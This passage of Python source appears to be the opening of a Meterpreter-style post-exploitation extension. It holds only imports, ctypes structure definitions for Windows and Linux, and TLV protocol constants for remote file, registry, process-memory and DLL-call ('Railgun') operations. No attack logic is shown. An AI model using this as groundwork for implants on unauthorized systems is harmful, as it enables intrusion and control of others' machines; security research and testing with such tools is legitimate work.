import fnmatch
import functools
import getpass
import os
import platform
import re
import select
import shlex
import shutil
import socket
import struct
import subprocess
import sys
import time
import binascii

try:
    import ctypes
    import ctypes.util
    has_ctypes = True
    has_windll = hasattr(ctypes, 'windll')
except ImportError:
    has_ctypes = False
    has_windll = False

try:
    import pty
    has_pty = True
except ImportError:
    has_pty = False

try:
    import pwd
    has_pwd = True
except ImportError:
    has_pwd = False

try:
    import termios
    has_termios = True
except ImportError:
    has_termios = False

try:
    import fcntl
    has_fcntl = True
except ImportError:
    has_fcntl = False

try:
    import _winreg as winreg
    has_winreg = True
except ImportError:
    has_winreg = False

try:
    import winreg
    has_winreg = True
except ImportError:
    has_winreg = (has_winreg or False)

if sys.version_info[0] < 3:
    is_str = lambda obj: issubclass(obj.__class__, str)
    is_bytes = lambda obj: issubclass(obj.__class__, str)
    bytes = lambda *args: str(*args[:1])
    NULL_BYTE = '\x00'
    unicode = lambda x: (x.decode('UTF-8') if isinstance(x, str) else x)
else:
    if isinstance(__builtins__, dict):
        is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
        str = lambda x: __builtins__['str'](x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
    else:
        is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
        str = lambda x: __builtins__.str(x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
    is_bytes = lambda obj: issubclass(obj.__class__, bytes)
    NULL_BYTE = bytes('\x00', 'UTF-8')
    long = int
    unicode = lambda x: (x.decode('UTF-8') if isinstance(x, bytes) else x)

libc = None

if has_ctypes:
    if sys.platform == 'darwin' or sys.platform.startswith('linux'):
        libc = ctypes.CDLL(ctypes.util.find_library('c'))
    size_t = getattr(ctypes, 'c_uint' + str(ctypes.sizeof(ctypes.c_void_p) * 8))
    #
    # Windows Structures
    #
    class EVENTLOGRECORD(ctypes.Structure):
        _fields_ = [("Length", ctypes.c_uint32),
            ("Reserved", ctypes.c_uint32),
            ("RecordNumber", ctypes.c_uint32),
            ("TimeGenerated", ctypes.c_uint32),
            ("TimeWritten", ctypes.c_uint32),
            ("EventID", ctypes.c_uint32),
            ("EventType", ctypes.c_uint16),
            ("NumStrings", ctypes.c_uint16),
            ("EventCategory", ctypes.c_uint16),
            ("ReservedFlags", ctypes.c_uint16),
            ("ClosingRecordNumber", ctypes.c_uint32),
            ("StringOffset", ctypes.c_uint32),
            ("UserSidLength", ctypes.c_uint32),
            ("UserSidOffset", ctypes.c_uint32),
            ("DataLength", ctypes.c_uint32),
            ("DataOffset", ctypes.c_uint32)]

    class SOCKADDR(ctypes.Structure):
        _fields_ = [("sa_family", ctypes.c_ushort),
            ("sa_data", (ctypes.c_uint8 * 14))]

    class SOCKET_ADDRESS(ctypes.Structure):
        _fields_ = [("lpSockaddr", ctypes.POINTER(SOCKADDR)),
            ("iSockaddrLength", ctypes.c_int)]

    class sockaddr_in(ctypes.Structure):
        _fields_ = [("sin_family", ctypes.c_short),
            ("sin_port", ctypes.c_ushort),
            ("sin_addr", ctypes.c_byte * 4),
            ("sin_zero", ctypes.c_char * 8)
        ]
    SOCKADDR_IN = sockaddr_in

    class sockaddr_in6(ctypes.Structure):
        _fields_ = [("sin6_family", ctypes.c_short),
            ("sin6_port", ctypes.c_ushort),
            ("sin6_flowinfo", ctypes.c_ulong),
            ("sin6_addr", ctypes.c_byte * 16),
            ("sin6_scope_id", ctypes.c_ulong)
        ]
    SOCKADDR_IN6 = sockaddr_in6

    class SOCKADDR_INET(ctypes.Union):
        _fields_ = [("Ipv4", SOCKADDR_IN),
            ("Ipv6", SOCKADDR_IN6),
            ("si_family", ctypes.c_short)
        ]

    class IP_ADAPTER_UNICAST_ADDRESS(ctypes.Structure):
        _fields_ = [
            ("s", type(
                    '_s_IP_ADAPTER_UNICAST_ADDRESS',
                    (ctypes.Structure,),
                    dict(_fields_=[
                        ("Length", ctypes.c_ulong),
                        ("Flags", ctypes.c_uint32)
                    ])
            )),
            ("Next", ctypes.c_void_p),
            ("Address", SOCKET_ADDRESS),
            ("PrefixOrigin", ctypes.c_uint32),
            ("SuffixOrigin", ctypes.c_uint32),
            ("DadState", ctypes.c_uint32),
            ("ValidLifetime", ctypes.c_ulong),
            ("PreferredLifetime", ctypes.c_ulong),
            ("LeaseLifetime", ctypes.c_ulong),
            ("OnLinkPrefixLength", ctypes.c_uint8)]

    class IP_ADAPTER_ADDRESSES(ctypes.Structure):
        _fields_ = [
            ("u", type(
                '_u_IP_ADAPTER_ADDRESSES',
                (ctypes.Union,),
                dict(_fields_ = [
                    ("Alignment", ctypes.c_ulonglong),
                    ("s", type(
                        '_s_IP_ADAPTER_ADDRESSES',
                        (ctypes.Structure,),
                        dict(_fields_ = [
                            ("Length", ctypes.c_ulong),
                            ("IfIndex", ctypes.c_uint32)
                        ])
                    ))
                ])
            )),
            ("Next", ctypes.c_void_p),
            ("AdapterName", ctypes.c_char_p),
            ("FirstUnicastAddress", ctypes.c_void_p),
            ("FirstAnycastAddress", ctypes.c_void_p),
            ("FirstMulticastAddress", ctypes.c_void_p),
            ("FirstDnsServerAddress", ctypes.c_void_p),
            ("DnsSuffix", ctypes.c_wchar_p),
            ("Description", ctypes.c_wchar_p),
            ("FriendlyName", ctypes.c_wchar_p),
            ("PhysicalAddress", (ctypes.c_uint8 * 8)),
            ("PhysicalAddressLength", ctypes.c_uint32),
            ("Flags", ctypes.c_uint32),
            ("Mtu", ctypes.c_uint32),
            ("IfType", ctypes.c_uint32),
            ("OperStatus", ctypes.c_uint32),
            ("Ipv6IfIndex", ctypes.c_uint32),
            ("ZoneIndices", (ctypes.c_uint32 * 16)),
            ("FirstPrefix", ctypes.c_void_p),
            ("TransmitLinkSpeed", ctypes.c_uint64),
            ("ReceiveLinkSpeed", ctypes.c_uint64),
            ("FirstWinsServerAddress", ctypes.c_void_p),
            ("FirstGatewayAddress", ctypes.c_void_p),
            ("Ipv4Metric", ctypes.c_ulong),
            ("Ipv6Metric", ctypes.c_ulong),
            ("Luid", ctypes.c_uint64),
            ("Dhcpv4Server", SOCKET_ADDRESS),
            ("CompartmentId", ctypes.c_uint32),
            ("NetworkGuid", (ctypes.c_uint8 * 16)),
            ("ConnectionType", ctypes.c_uint32),
            ("TunnelType", ctypes.c_uint32),
            ("Dhcpv6Server", SOCKET_ADDRESS),
            ("Dhcpv6ClientDuid", (ctypes.c_uint8 * 130)),
            ("Dhcpv6ClientDuidLength", ctypes.c_ulong),
            ("Dhcpv6Iaid", ctypes.c_ulong),
            ("FirstDnsSuffix", ctypes.c_void_p)]

    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint32),
            ("dwTime", ctypes.c_uint32)]

    class MIB_IPINTERFACE_ROW(ctypes.Structure):
        _fields_ = [("Family", ctypes.c_uint16),
            ("InterfaceLuid", ctypes.c_uint64),
            ("InterfaceIndex", ctypes.c_uint32),
            ("MaxReassemblySize", ctypes.c_uint32),
            ("InterfaceIdentifier", ctypes.c_uint64),
            ("MinRouterAdvertisementInterval", ctypes.c_uint32),
            ("MaxRouterAdvertisementInterval", ctypes.c_uint32),
            ("AdvertisingEnabled", ctypes.c_uint8),
            ("ForwardingEnabled", ctypes.c_uint8),
            ("WeakHostSend", ctypes.c_uint8),
            ("WeakHostReceive", ctypes.c_uint8),
            ("UseAutomaticMetric", ctypes.c_uint8),
            ("UseNeighborUnreachabilityDetection", ctypes.c_uint8),
            ("ManagedAddressConfigurationSupported", ctypes.c_uint8),
            ("OtherStatefulConfigurationSupported", ctypes.c_uint8),
            ("AdvertiseDefaultRoute", ctypes.c_uint8),
            ("RouterDiscoveryBehavior", ctypes.c_uint32),
            ("DadTransmits", ctypes.c_uint32),
            ("BaseReachableTime", ctypes.c_uint32),
            ("RetransmitTime", ctypes.c_uint32),
            ("PathMtuDiscoveryTimeout", ctypes.c_uint32),
            ("LinkLocalAddressBehavior", ctypes.c_uint32),
            ("LinkLocalAddressTimeout", ctypes.c_uint32),
            ("ZoneIndices", ctypes.c_uint32 * 16),
            ("SitePrefixLength", ctypes.c_uint32),
            ("Metric", ctypes.c_uint32),
            ("NlMtu", ctypes.c_uint32),
            ("Connected", ctypes.c_uint8),
            ("SupportsWakeUpPatterns", ctypes.c_uint8),
            ("SupportsNeighborDiscovery", ctypes.c_uint8),
            ("SupportsRouterDiscovery", ctypes.c_uint8),
            ("ReachableTime", ctypes.c_uint32),
            ("TransmitOffload", ctypes.c_uint8),
            ("ReceiveOffload", ctypes.c_uint8),
            ("DisableDefaultRoutes", ctypes.c_uint8),
        ]

    class IP_ADDRESS_PREFIX(ctypes.Structure):
        _fields_ = [("Prefix", SOCKADDR_INET),
            ("PrefixLength", ctypes.c_uint8)
        ]

    class MIB_IPFORWARDROW(ctypes.Structure):
        _fields_ = [("dwForwardDest", ctypes.c_uint32),
            ("dwForwardMask", ctypes.c_uint32),
            ("dwForwardPolicy", ctypes.c_uint32),
            ("dwForwardNextHop", ctypes.c_uint32),
            ("dwForwardIfIndex", ctypes.c_uint32),
            ("dwForwardType", ctypes.c_uint32),
            ("dwForwardProto", ctypes.c_uint32),
            ("dwForwardAge", ctypes.c_uint32),
            ("dwForwardNextHopAS", ctypes.c_uint32),
            ("dwForwardMetric1", ctypes.c_uint32),
            ("dwForwardMetric2", ctypes.c_uint32),
            ("dwForwardMetric3", ctypes.c_uint32),
            ("dwForwardMetric4", ctypes.c_uint32),
            ("dwForwardMetric5", ctypes.c_uint32),
        ]
    PMIB_IPFORWARDROW = ctypes.POINTER(MIB_IPFORWARDROW)

    class MIB_IPFORWARD_ROW2(ctypes.Structure):
        _fields_ = [("InterfaceLuid", ctypes.c_uint64),
            ("InterfaceIndex", ctypes.c_uint32),
            ("DestinationPrefix", IP_ADDRESS_PREFIX),
            ("NextHop", SOCKADDR_INET),
            ("SitePrefixLength", ctypes.c_uint8),
            ("ValidLifetime", ctypes.c_uint32),
            ("PreferredLifetime", ctypes.c_uint32),
            ("Metric", ctypes.c_uint32),
            ("Protocol", ctypes.c_uint32),
            ("Loopback", ctypes.c_byte),
            ("AutoconfigureAddress", ctypes.c_byte),
            ("Publish", ctypes.c_byte),
            ("Immortal", ctypes.c_byte),
            ("Age", ctypes.c_uint32),
            ("Origin", ctypes.c_uint32),
        ]
    PMIB_IPFORWARD_ROW2 = ctypes.POINTER(MIB_IPFORWARD_ROW2)


    class MIB_IPFORWARDTABLE(ctypes.Structure):
        _fields_ = [("dwNumEntries", ctypes.c_uint32),
            ("table", MIB_IPFORWARDROW * 0)
        ]
    PMIB_IPFORWARDTABLE = ctypes.POINTER(MIB_IPFORWARDTABLE)

    class MIB_IPFORWARD_TABLE2(ctypes.Structure):
        _fields_ = [("NumEntries", ctypes.c_uint32),
            ("Table", MIB_IPFORWARD_ROW2 * 0)
        ]
    PMIB_IPFORWARD_TABLE2 = ctypes.POINTER(MIB_IPFORWARD_TABLE2)

    class OSVERSIONINFOEXW(ctypes.Structure):
        _fields_ = [("dwOSVersionInfoSize", ctypes.c_uint32),
            ("dwMajorVersion", ctypes.c_uint32),
            ("dwMinorVersion", ctypes.c_uint32),
            ("dwBuildNumber", ctypes.c_uint32),
            ("dwPlatformId", ctypes.c_uint32),
            ("szCSDVersion", (ctypes.c_wchar * 128)),
            ("wServicePackMajor", ctypes.c_uint16),
            ("wServicePackMinor", ctypes.c_uint16),
            ("wSuiteMask", ctypes.c_uint16),
            ("wProductType", ctypes.c_uint8),
            ("wReserved", ctypes.c_uint8)]

    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [("dwSize", ctypes.c_uint32),
            ("cntUsage", ctypes.c_uint32),
            ("th32ProcessID", ctypes.c_uint32),
            ("th32DefaultHeapID", ctypes.c_void_p),
            ("th32ModuleID", ctypes.c_uint32),
            ("cntThreads", ctypes.c_uint32),
            ("th32ParentProcessID", ctypes.c_uint32),
            ("thPriClassBase", ctypes.c_int32),
            ("dwFlags", ctypes.c_uint32),
            ("szExeFile", (ctypes.c_char * 260))]

    class SID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("Sid", ctypes.c_void_p),
            ("Attributes", ctypes.c_uint32)]

    class SYSTEM_INFO(ctypes.Structure):
        _fields_ = [("wProcessorArchitecture", ctypes.c_uint16),
            ("wReserved", ctypes.c_uint16),
            ("dwPageSize", ctypes.c_uint32),
            ("lpMinimumApplicationAddress", ctypes.c_void_p),
            ("lpMaximumApplicationAddress", ctypes.c_void_p),
            ("dwActiveProcessorMask", ctypes.c_uint32),
            ("dwNumberOfProcessors", ctypes.c_uint32),
            ("dwProcessorType", ctypes.c_uint32),
            ("dwAllocationGranularity", ctypes.c_uint32),
            ("wProcessorLevel", ctypes.c_uint16),
            ("wProcessorRevision", ctypes.c_uint16)]

    class TOKEN_USER(ctypes.Structure):
        _fields_ = [("User", SID_AND_ATTRIBUTES)]

    class UNIVERSAL_NAME_INFO(ctypes.Structure):
        _fields_ = [("lpUniversalName", ctypes.c_wchar_p)]

    class WINHTTP_CURRENT_USER_IE_PROXY_CONFIG(ctypes.Structure):
        _fields_ = [("fAutoDetect", ctypes.c_int8),
            ("lpszAutoConfigUrl", ctypes.c_wchar_p),
            ("lpszProxy", ctypes.c_wchar_p),
            ("lpszProxyBypass", ctypes.c_wchar_p)]

    class LUID(ctypes.Structure):
        _fields_ = [
            ('LowPart',  ctypes.c_uint32),
            ('HighPart', ctypes.c_long)
        ]

        def __eq__(self, __o):
            return (self.LowPart == __o.LowPart and self.HighPart == __o.HighPart)

        def __ne__(self, __o):
            return (self.LowPart != __o.LowPart or self.HighPart != __o.HighPart)

    class LUID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ('Luid',       LUID),
            ('Attributes', ctypes.c_uint32)
        ]

    class TOKEN_PRIVILEGES(ctypes.Structure):
        _fields_ = [
            ('PrivilegeCount', ctypes.c_uint32),
            ('Privileges',     LUID_AND_ATTRIBUTES * 0),
        ]
        def get_array(self):
            array_type = LUID_AND_ATTRIBUTES * self.PrivilegeCount
            return ctypes.cast(self.Privileges, ctypes.POINTER(array_type)).contents

    PTOKEN_PRIVILEGES = ctypes.POINTER(TOKEN_PRIVILEGES)

    MAXLEN_PHYSADDR = 8

    class MIB_IPNETROW(ctypes.Structure):
        _fields_ = [
            ('dwIndex', ctypes.c_uint32),
            ('dwPhysAddrLen', ctypes.c_uint32),
            ('bPhysAddr', ctypes.c_byte * MAXLEN_PHYSADDR),
            ('dwAddr', ctypes.c_uint32),
            ('dwType', ctypes.c_uint32)
        ]

    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [
            ('BaseAddress', ctypes.c_void_p),
            ('AllocationBase', ctypes.c_void_p),
            ('AllocationProtect', ctypes.c_ulong),
            ('PartitionId', ctypes.c_ushort),
            ('RegionSize', ctypes.c_size_t),
            ('State', ctypes.c_ulong),
            ('Protect', ctypes.c_ulong),
            ('Type', ctypes.c_ulong)
        ]


    #
    # Linux Structures
    #
    class IFADDRMSG(ctypes.Structure):
        _fields_ = [("family", ctypes.c_uint8),
            ("prefixlen", ctypes.c_uint8),
            ("flags", ctypes.c_uint8),
            ("scope", ctypes.c_uint8),
            ("index", ctypes.c_int32)]

    class IFINFOMSG(ctypes.Structure):
        _fields_ = [("family", ctypes.c_uint8),
            ("pad", ctypes.c_int8),
            ("type", ctypes.c_uint16),
            ("index", ctypes.c_int32),
            ("flags", ctypes.c_uint32),
            ("chagen", ctypes.c_uint32)]

    class IOVEC(ctypes.Structure):
        _fields_ = [("iov_base", ctypes.c_void_p),
            ("iov_len", size_t)]

    class NLMSGHDR(ctypes.Structure):
        _fields_ = [("len", ctypes.c_uint32),
            ("type", ctypes.c_uint16),
            ("flags", ctypes.c_uint16),
            ("seq", ctypes.c_uint32),
            ("pid", ctypes.c_uint32)]

    class RTATTR(ctypes.Structure):
        _fields_ = [("len", ctypes.c_uint16),
            ("type", ctypes.c_uint16)]

    class RTMSG(ctypes.Structure):
        _fields_ = [("family", ctypes.c_uint8),
            ("dst_len", ctypes.c_uint8),
            ("src_len", ctypes.c_uint8),
            ("tos", ctypes.c_uint8),
            ("table", ctypes.c_uint8),
            ("protocol", ctypes.c_uint8),
            ("scope", ctypes.c_uint8),
            ("type", ctypes.c_uint8),
            ("flags", ctypes.c_uint32)]

TLV_EXTENSIONS           = 20000
#
# TLV Meta Types
#
TLV_META_TYPE_NONE       = (   0   )
TLV_META_TYPE_STRING     = (1 << 16)
TLV_META_TYPE_UINT       = (1 << 17)
TLV_META_TYPE_RAW        = (1 << 18)
TLV_META_TYPE_BOOL       = (1 << 19)
TLV_META_TYPE_QWORD      = (1 << 20)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP      = (1 << 30)
TLV_META_TYPE_COMPLEX    = (1 << 31)
# not defined in original
TLV_META_TYPE_MASK = (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)

#
# TLV Specific Types
#
TLV_TYPE_ANY                   = TLV_META_TYPE_NONE    | 0
TLV_TYPE_METHOD                = TLV_META_TYPE_STRING  | 1
TLV_TYPE_REQUEST_ID            = TLV_META_TYPE_STRING  | 2
TLV_TYPE_EXCEPTION             = TLV_META_TYPE_GROUP   | 3
TLV_TYPE_RESULT                = TLV_META_TYPE_UINT    | 4

TLV_TYPE_STRING                = TLV_META_TYPE_STRING  | 10
TLV_TYPE_UINT                  = TLV_META_TYPE_UINT    | 11
TLV_TYPE_BOOL                  = TLV_META_TYPE_BOOL    | 12

TLV_TYPE_LENGTH                = TLV_META_TYPE_UINT    | 25
TLV_TYPE_DATA                  = TLV_META_TYPE_RAW     | 26
TLV_TYPE_FLAGS                 = TLV_META_TYPE_UINT    | 27

TLV_TYPE_CHANNEL_ID            = TLV_META_TYPE_UINT    | 50
TLV_TYPE_CHANNEL_TYPE          = TLV_META_TYPE_STRING  | 51
TLV_TYPE_CHANNEL_DATA          = TLV_META_TYPE_RAW     | 52
TLV_TYPE_CHANNEL_DATA_GROUP    = TLV_META_TYPE_GROUP   | 53
TLV_TYPE_CHANNEL_CLASS         = TLV_META_TYPE_UINT    | 54

##
# General
##
TLV_TYPE_HANDLE                = TLV_META_TYPE_QWORD   | 600
TLV_TYPE_INHERIT               = TLV_META_TYPE_BOOL    | 601
TLV_TYPE_PROCESS_HANDLE        = TLV_META_TYPE_QWORD   | 630
TLV_TYPE_THREAD_HANDLE         = TLV_META_TYPE_QWORD   | 631
TLV_TYPE_PRIVILEGE             = TLV_META_TYPE_STRING  | 632

##
# Fs
##
TLV_TYPE_DIRECTORY_PATH        = TLV_META_TYPE_STRING  | 1200
TLV_TYPE_FILE_NAME             = TLV_META_TYPE_STRING  | 1201
TLV_TYPE_FILE_PATH             = TLV_META_TYPE_STRING  | 1202
TLV_TYPE_FILE_MODE             = TLV_META_TYPE_STRING  | 1203
TLV_TYPE_FILE_SIZE             = TLV_META_TYPE_UINT    | 1204
TLV_TYPE_FILE_HASH             = TLV_META_TYPE_RAW     | 1206

TLV_TYPE_MOUNT_GROUP           = TLV_META_TYPE_GROUP   | 1207
TLV_TYPE_MOUNT_NAME            = TLV_META_TYPE_STRING  | 1208
TLV_TYPE_MOUNT_TYPE            = TLV_META_TYPE_UINT    | 1209
TLV_TYPE_MOUNT_SPACE_USER      = TLV_META_TYPE_QWORD   | 1210
TLV_TYPE_MOUNT_SPACE_TOTAL     = TLV_META_TYPE_QWORD   | 1211
TLV_TYPE_MOUNT_SPACE_FREE      = TLV_META_TYPE_QWORD   | 1212
TLV_TYPE_MOUNT_UNCPATH         = TLV_META_TYPE_STRING  | 1213

TLV_TYPE_STAT_BUF              = TLV_META_TYPE_COMPLEX | 1221

TLV_TYPE_SEARCH_RECURSE        = TLV_META_TYPE_BOOL    | 1230
TLV_TYPE_SEARCH_GLOB           = TLV_META_TYPE_STRING  | 1231
TLV_TYPE_SEARCH_ROOT           = TLV_META_TYPE_STRING  | 1232
TLV_TYPE_SEARCH_RESULTS        = TLV_META_TYPE_GROUP   | 1233

TLV_TYPE_FILE_MODE_T           = TLV_META_TYPE_UINT    | 1234
TLV_TYPE_SEARCH_MTIME          = TLV_META_TYPE_UINT    | 1235
TLV_TYPE_SEARCH_M_START_DATE   = TLV_META_TYPE_UINT    | 1236
TLV_TYPE_SEARCH_M_END_DATE     = TLV_META_TYPE_UINT    | 1237

##
# Net
##
TLV_TYPE_HOST_NAME             = TLV_META_TYPE_STRING  | 1400
TLV_TYPE_PORT                  = TLV_META_TYPE_UINT    | 1401
TLV_TYPE_INTERFACE_MTU         = TLV_META_TYPE_UINT    | 1402
TLV_TYPE_INTERFACE_FLAGS       = TLV_META_TYPE_STRING  | 1403
TLV_TYPE_INTERFACE_INDEX       = TLV_META_TYPE_UINT    | 1404

TLV_TYPE_SUBNET                = TLV_META_TYPE_RAW     | 1420
TLV_TYPE_NETMASK               = TLV_META_TYPE_RAW     | 1421
TLV_TYPE_GATEWAY               = TLV_META_TYPE_RAW     | 1422
TLV_TYPE_NETWORK_ROUTE         = TLV_META_TYPE_GROUP   | 1423
TLV_TYPE_IP_PREFIX             = TLV_META_TYPE_UINT    | 1424
TLV_TYPE_ARP_ENTRY             = TLV_META_TYPE_GROUP   | 1425

TLV_TYPE_IP                    = TLV_META_TYPE_RAW     | 1430
TLV_TYPE_MAC_ADDRESS           = TLV_META_TYPE_RAW     | 1431
TLV_TYPE_MAC_NAME              = TLV_META_TYPE_STRING  | 1432
TLV_TYPE_NETWORK_INTERFACE     = TLV_META_TYPE_GROUP   | 1433
TLV_TYPE_IP6_SCOPE             = TLV_META_TYPE_RAW     | 1434

TLV_TYPE_SUBNET_STRING         = TLV_META_TYPE_STRING  | 1440
TLV_TYPE_NETMASK_STRING        = TLV_META_TYPE_STRING  | 1441
TLV_TYPE_GATEWAY_STRING        = TLV_META_TYPE_STRING  | 1442
TLV_TYPE_ROUTE_METRIC          = TLV_META_TYPE_UINT    | 1443
TLV_TYPE_ADDR_TYPE             = TLV_META_TYPE_UINT    | 1444

##
# Proxy configuration
##
TLV_TYPE_PROXY_CFG_AUTODETECT    = TLV_META_TYPE_BOOL    | 1445
TLV_TYPE_PROXY_CFG_AUTOCONFIGURL = TLV_META_TYPE_STRING  | 1446
TLV_TYPE_PROXY_CFG_PROXY         = TLV_META_TYPE_STRING  | 1447
TLV_TYPE_PROXY_CFG_PROXYBYPASS   = TLV_META_TYPE_STRING  | 1448

##
# Socket
##
TLV_TYPE_PEER_HOST             = TLV_META_TYPE_STRING  | 1500
TLV_TYPE_PEER_PORT             = TLV_META_TYPE_UINT    | 1501
TLV_TYPE_LOCAL_HOST            = TLV_META_TYPE_STRING  | 1502
TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503
TLV_TYPE_CONNECT_RETRIES       = TLV_META_TYPE_UINT    | 1504

TLV_TYPE_SHUTDOWN_HOW          = TLV_META_TYPE_UINT    | 1530

##
# Railgun
##
TLV_TYPE_EXTENSION_RAILGUN             = 0
TLV_TYPE_RAILGUN_SIZE_OUT              = TLV_META_TYPE_UINT   | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 1)
TLV_TYPE_RAILGUN_STACKBLOB             = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 2)
TLV_TYPE_RAILGUN_BUFFERBLOB_IN         = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 3)
TLV_TYPE_RAILGUN_BUFFERBLOB_INOUT      = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 4)
TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_OUT   = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 5)
TLV_TYPE_RAILGUN_BACK_BUFFERBLOB_INOUT = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 6)
TLV_TYPE_RAILGUN_BACK_RET              = TLV_META_TYPE_QWORD  | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 7)
TLV_TYPE_RAILGUN_BACK_ERR              = TLV_META_TYPE_UINT   | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 8)
TLV_TYPE_RAILGUN_DLLNAME               = TLV_META_TYPE_STRING | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 9)
TLV_TYPE_RAILGUN_FUNCNAME              = TLV_META_TYPE_STRING | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 10)
TLV_TYPE_RAILGUN_MULTI_GROUP           = TLV_META_TYPE_GROUP  | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 11)
TLV_TYPE_RAILGUN_MEM_ADDRESS           = TLV_META_TYPE_QWORD  | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 12)
TLV_TYPE_RAILGUN_MEM_DATA              = TLV_META_TYPE_RAW    | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 13)
TLV_TYPE_RAILGUN_MEM_LENGTH            = TLV_META_TYPE_UINT   | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 14)
TLV_TYPE_RAILGUN_CALLCONV              = TLV_META_TYPE_STRING | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 15)
TLV_TYPE_RAILGUN_BACK_MSG              = TLV_META_TYPE_STRING | (TLV_TYPE_EXTENSION_RAILGUN + TLV_EXTENSIONS + 16)

##
# Registry
##
TLV_TYPE_HKEY                  = TLV_META_TYPE_QWORD   | 1000
TLV_TYPE_ROOT_KEY              = TLV_TYPE_HKEY
TLV_TYPE_BASE_KEY              = TLV_META_TYPE_STRING  | 1001
TLV_TYPE_PERMISSION            = TLV_META_TYPE_UINT    | 1002
TLV_TYPE_KEY_NAME              = TLV_META_TYPE_STRING  | 1003
TLV_TYPE_VALUE_NAME            = TLV_META_TYPE_STRING  | 1010
TLV_TYPE_VALUE_TYPE            = TLV_META_TYPE_UINT    | 1011
TLV_TYPE_VALUE_DATA            = TLV_META_TYPE_RAW     | 1012
TLV_TYPE_TARGET_HOST           = TLV_META_TYPE_STRING  | 1013

##
# Config
##
TLV_TYPE_COMPUTER_NAME         = TLV_META_TYPE_STRING  | 1040
TLV_TYPE_OS_NAME               = TLV_META_TYPE_STRING  | 1041
TLV_TYPE_USER_NAME             = TLV_META_TYPE_STRING  | 1042
TLV_TYPE_ARCHITECTURE          = TLV_META_TYPE_STRING  | 1043
TLV_TYPE_LANG_SYSTEM           = TLV_META_TYPE_STRING  | 1044
TLV_TYPE_SID                   = TLV_META_TYPE_STRING  | 1045
TLV_TYPE_LOCAL_DATETIME        = TLV_META_TYPE_STRING  | 1048

##
# Environment
##
TLV_TYPE_ENV_VARIABLE          = TLV_META_TYPE_STRING  | 1100
TLV_TYPE_ENV_VALUE             = TLV_META_TYPE_STRING  | 1101
TLV_TYPE_ENV_GROUP             = TLV_META_TYPE_GROUP   | 1102

DELETE_KEY_FLAG_RECURSIVE = (1 << 0)

##
# Process
##
TLV_TYPE_BASE_ADDRESS          = TLV_META_TYPE_QWORD   | 2000
TLV_TYPE_ALLOCATION_TYPE       = TLV_META_TYPE_UINT    | 2001
TLV_TYPE_PROTECTION            = TLV_META_TYPE_UINT    | 2002
TLV_TYPE_PROCESS_PERMS         = TLV_META_TYPE_UINT    | 2003
TLV_TYPE_PROCESS_MEMORY        = TLV_META_TYPE_RAW     | 2004
TLV_TYPE_ALLOC_BASE_ADDRESS    = TLV_META_TYPE_QWORD   | 2005
TLV_TYPE_MEMORY_STATE          = TLV_META_TYPE_UINT    | 2006
TLV_TYPE_MEMORY_TYPE           = TLV_META_TYPE_UINT    | 2007
TLV_TYPE_ALLOC_PROTECTION      = TLV_META_TYPE_UINT    | 2008
TLV_TYPE_PID                   = TLV_META_TYPE_UINT    | 2300
TLV_TYPE_PROCESS_NAME          = TLV_META_TYPE_STRING  | 2301
TLV_TYPE_PROCESS_PATH          = TLV_META_TYPE_STRING  | 2302
TLV_TYPE_PROCESS_GROUP         = TLV_META_TYPE_GROUP   | 2303
TLV_TYPE_PROCESS_FLAGS         = TLV_META_TYPE_UINT    | 2304
TLV_TYPE_PROCESS_ARGUMENTS     = TLV_META_TYPE_STRING  | 2305
TLV_TYPE_PROCESS_ARCH          = TLV_META_TYPE_UINT    | 2306
TLV_TYPE_PARENT_PID            = TLV_META_TYPE_UINT    | 2307

TLV_TYPE_IMAGE_FILE            = TLV_META_TYPE_STRING  | 2400
TLV_TYPE_IMAGE_FILE_PATH       = TLV_META_TYPE_STRING  | 2401
TLV_TYPE_PROCEDURE_NAME        = TLV_META_TYPE_STRING  | 2402
TLV_TYPE_PROCEDURE_ADDRESS     = TLV_META_TYPE_QWORD   | 2403
TLV_TYPE_IMAGE_BASE            = TLV_META_TYPE_QWORD   | 2404
TLV_TYPE_IMAGE_GROUP           = TLV_META_TYPE_GROUP   | 2405
TLV_TYPE_IMAGE_NAME            = TLV_META_TYPE_STRING  | 2406

TLV_TYPE_THREAD_ID             = TLV_META_TYPE_UINT    | 2500
TLV_TYPE_THREAD_PERMS          = TLV_META_TYPE_UINT    | 2502
TLV_TYPE_EXIT_CODE             = TLV_META_TYPE_UINT    | 2510
TLV_TYPE_ENTRY_POINT           = TLV_META_TYPE_QWORD   | 2511
TLV_TYPE_ENTRY_PARAMETER       = TLV_META_TYPE_QWORD   | 2512
TLV_TYPE_CREATION_FLAGS        = TLV_META_TYPE_UINT    | 2513

